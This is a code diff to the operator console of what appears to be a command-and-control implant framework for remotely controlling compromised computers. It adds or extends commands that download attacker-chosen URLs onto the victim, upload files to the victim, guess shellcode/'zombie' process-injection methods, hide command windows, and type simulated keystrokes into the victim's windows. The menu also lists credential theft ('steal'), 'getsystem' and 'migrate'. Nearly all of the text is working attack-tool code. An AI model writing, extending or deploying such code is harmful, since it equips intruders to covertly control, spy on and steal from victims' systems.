@@ -17,6 +17,7 @@
 
 from shlex import split
 from base64 import b64encode
+from os.path import basename
 from string import whitespace
 from datetime import datetime
 from include.cli.helpers import is_valid_name, make_menu
@@ -127,6 +128,7 @@ _MENU = [
     "set_hide",
     "shell",
     "shutdown",
+    "show_window",
     "sleep",
     "spawn",
     "steal",
@@ -135,6 +137,7 @@ _MENU = [
     "untrust",
     "upload",
     "wallpaper",
+    "whoami",
     "window",
     "workhours",
     "write",
@@ -157,7 +160,11 @@ _EVADE_TYPES = [
 
 
 def _is_help(a):
-    return len(a) == 1 and (a[0] == "-h" or a[0] == "/?" or a[0] == "?")
+    if a is None:
+        return False
+    return (
+        len(a) == 2 and (a[0] == "-" or a[0] == "/") and (a[1] == "h" or a[1] == "?")
+    ) or (len(a) == 1 and (a[0] == "-h" or a[0] == "/?" or a[0] == "?"))
 
 
 def _split_list(v):
@@ -277,6 +284,18 @@ def _get_callable(type, show, r, asm, dll):
             if nes(d):
                 p["domain"] = d
             del u, d
+        b, x = bytes_from_src(r.data, path=True, b64=False, no_err=True)
+        if not x and b is not None:
+            p = {"show": show, "data": b64encode(b).decode("UTF-8")}
+            if nes(r.entry):
+                p["entry"] = r.entry
+            if nes(r.args):
+                p["fake"] = r.args
+                print('[+] Guessing method "zombie" based on arguments.')
+                return "zombie", p
+            print('[+] Guessing method "asm" based on arguments.')
+            return "asm", p
+        del b, x
         print('[+] Guessing method "exec" based on arguments.')
         return "exec", p
     m = r.method.lower()
@@ -430,7 +449,7 @@ class MenuBolt(object):
         |  [-X|--tls-insecure]
         |  [-r|--read]
         |  [-t|--timeout]     <seconds
-        |  [-o|--output]      <local_file_path>
+        |  [-o|--output]      <local_path>
         |  <host:port>
         |  [data]
 
@@ -1060,14 +1079,17 @@ class MenuBolt(object):
 
     def do_pull(self, *a):
         """
-        pull [-a|--agent user-agent] <url> <remote_path>
+        pull [-a|--agent agent] [-o|--output local_path] [-r|--redirect] <url> [remote_path]
 
         OS:    Any
-        OPsec: Not Safe! Disk Write
+        OPsec: Not Safe! Disk Write (If a remote path is used)
         Admin: Maybe (depends on target)
 
         Downloads the file at the supplied URL (as the client) and save it to
-        the specified remote path.
+        the specified remote path. If a remote path is not used and the "-r" or
+        "--redirect" argument is used, the results will be returned instead. If
+        the "-o" argument is used, it will be saved to the supplied local file path.
+        Otherwise, the basename of the file will be used instead.
 
         The "-a" or "--agent" argument may be specified to change the User-Agent
         the client uses to connect to the server. String-Var Dynamic Values are
@@ -1081,12 +1103,22 @@ class MenuBolt(object):
         """
         if _is_help(a):
             return self.do_help("pull")
-        if len(a) < 2:
-            return print("pull <url> <remote_path>")
+        if len(a) < 1:
+            return print("pull <url> [remote_path]")
         r = PARSERS[PARSER_PULL].parse_args(a, eq=True)
-        if not nes(r.url) or not nes(r.file):
-            return print("pull <url> <remote_path>")
-        self._exec(self.shell.cirrus.task_pull, url=r.url, dest=r.file, agent=r.agent)
+        if not nes(r.url):
+            return print("pull <url> [remote_path]")
+        if not r.redirect and not nes(r.file):
+            r.file = basename(r.url)
+        if r.redirect and nes(r.output):
+            return print('[!] Cannot use "-r"/"--redirect" with "-o"/"--output"!')
+        self._exec(
+            self.shell.cirrus.task_pull,
+            url=r.url,
+            path=r.file,
+            agent=r.agent,
+            dest=r.output,
+        )
 
     def do_pwsh(self, *a):
         """
@@ -1370,7 +1402,7 @@ class MenuBolt(object):
             self._password = r.pw
         self._user, self._domain = split_user_domain(r.user, r.domain)
         del r
-        return print(
+        print(
             f"Saved Credentials:\nUser:        {self._user}\n"
             f"Pass:        {self._password}\nDomain:      {self._domain}"
         )
@@ -1525,6 +1557,19 @@ class MenuBolt(object):
         Lists all mounted drives and/or shares connected to the client.
         """
         self._system("mounts")
+
+    def do_whoami(self, _):
+        """
+        whoami
+
+        OS:    Any
+        OPsec: Safe
+        Admin: No
+
+        Returns the current up-to-date username of the client without triggering
+        a refresh.
+        """
+        self._system("whoami")
 
     def do_spawn(self, *a):
         """
@@ -1748,9 +1793,10 @@ class MenuBolt(object):
             untrust 1337
             untrust taskmgr.exe
         """
-        if not nes(v):
-            if not do_ask("Are you sure you want to use the parent filter target"):
-                return print("[!] Untrust aborted")
+        if not nes(v) and not do_ask(
+            "Are you sure you want to use the parent filter target"
+        ):
+            return print("[!] Untrust aborted")
         self._system_filter("untrust", v)
 
     def do_parent(self, *a):
@@ -2405,8 +2451,8 @@ class MenuBolt(object):
             return print("migrate [pipe] [data]")
         r = PARSERS[PARSER_SPAWN].parse_args(a)
         if nes(self.shell.pipe) and not r.no_auto:
-            if not nes(r.file) and nes(r.pipe):
-                r.file = r.pipe
+            if not nes(r.data) and nes(r.pipe):
+                r.data = r.pipe
                 r.pipe = self.shell.pipe
                 print(HELP_PIPE.format(pipe=self.shell.pipe))
             elif not nes(r.pipe):
@@ -2677,13 +2723,17 @@ class MenuBolt(object):
 
     def do_upload(self, f, p):
         """
-        upload <data> <remote_path>
+        upload <data> [remote_path]
 
         OS:    Any
         OPsec: Not Safe! Disk Write
         Admin: Maybe (depends on target)
 
         Upload a local file to the client at the supplied remote_path.
+
+        If the remote file path is omitted or empty, the basename of the current
+        file will be used and it will be placed in the client's current working
+        directory.
 
         Environment variables are processed on the client (for the remote_path).
 
@@ -2693,11 +2743,14 @@ class MenuBolt(object):
         See "help data" for more info on Data Specification Identifiers.
 
         Examples:
+            upload ~/file
             upload ~/hacker_file.txt C:/file.txt
             upload note.txt $USERPROFILE/Desktop/note.txt
         """
-        if not nes(f) or not nes(p):
-            return print("upload <data> <remote_path>")
+        if not nes(f):
+            return print("upload <data> [remote_path]")
+        if not nes(p):
+            p = basename(f)
         self._exec(self.shell.cirrus.task_upload, data=f, dest=p)
 
     def do_getsystem(self, _):
@@ -2942,6 +2995,9 @@ class MenuBolt(object):
             troll hc false
             troll block_input
         """
+        print(_is_help(a))
+        if _is_help(a):
+            return self.do_help("troll")
         if not nes(a):
             return print("troll <action> [enable|disable]")
         if a[0] == "w" or a[0] == "w":
@@ -2954,7 +3010,7 @@ class MenuBolt(object):
                     return print("[!] WTF argument must be a number of seconds!")
             return self._exec(self.shell.cirrus.task_troll, action=a, arg1=None)
         self._exec(
-            self.shell.cirrus.task_troll, action=a, enabled=not nes(arg) or is_true(arg)
+            self.shell.cirrus.task_troll, action=a, enable=not nes(arg) or is_true(arg)
         )
 
     def do_parent_pid(self, v):
@@ -3179,6 +3235,35 @@ class MenuBolt(object):
             interactive=r.interactive,
         )
         del u, d, r
+
+    def do_show_window(self, v):
+        """
+        show_window [boolean]
+
+        OS:    n/a
+        OPsec: n/a
+        Admin: n/a
+
+        Enable/Disable global shell command visibility. If no option is specified,
+        command windows are hidden. Can take multiple types of boolean values
+        ("true", "T", "t", "yes", "y", "enable", "e", "1").
+
+        Alias of "set_hide"
+
+        Examples:
+            show_window
+            show_window no
+            show_window true
+        """
+        n = True
+        if len(v) > 0:
+            n = is_true(v)
+        n = not n
+        print(f"[+] Set Show Window: {self.show} => {n}.")
+        c = self.show != n
+        self.show = n
+        del n
+        return c
 
     def do_parent_clear(self, _):
         """
@@ -3510,7 +3595,7 @@ class MenuBolt(object):
 
     def do_window(self, a, handle, arg1, arg2, arg3, arg4):
         """
-        window <ls|close|disable|enable|focus|msgbox|move|show|trans>
+        window <ls|close|disable|enable|focus|input|msgbox|move|show|trans>
         |      [handle|all|*|0
         |      [args..]
 
@@ -3553,6 +3638,11 @@ class MenuBolt(object):
         fg, focus
         |  Focuses the window and brings user input to it. This command requires
         |  a handle and can only be used on a single window at a time.
+
+        in, input, type
+        |  Simulates keystrokes in order to type the message after the action.
+        |  Capital and spaces are preserved. If a valid window handle is specified,
+        |  this will force focus of the specified window before typing.
 
         mb, msg, msgbox, message, messagebox
         |  Show a MessagBox prompt as a child of the supplied window handle. A
